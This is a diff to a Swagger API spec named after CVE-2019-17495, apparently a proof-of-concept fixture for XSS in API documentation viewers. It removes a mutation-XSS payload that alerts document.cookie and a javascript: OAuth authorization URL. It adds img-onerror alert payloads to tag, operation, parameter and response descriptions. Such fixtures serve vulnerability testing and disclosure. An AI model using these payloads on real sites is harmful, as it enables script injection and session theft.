@@ -2,19 +2,20 @@ swagger: "2.0"
 info:
   title: CVE-2019-17495
   version: "1.0"
-  description: '<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>'
-securityDefinitions:
-  oauth2:
-    type: oauth2
-    authorizationUrl: "javascript:alert(document.domain)//"
-    flow: implicit
-    scopes:
-      read: read
+tags:
+  - name: xss
+    description: '<img src=x onerror=alert(document.domain)>'
 paths:
   /:
     get:
-      security:
-        - oauth2: [read]
+      tags:
+        - xss
+      description: '<img src=x onerror=alert(document.domain)>'
+      parameters:
+        - name: q
+          in: query
+          description: '<img src=x onerror=alert(document.domain)>'
+          type: string
       responses:
         200:
-          description: ok
+          description: '<img src=x onerror=alert(document.domain)>'
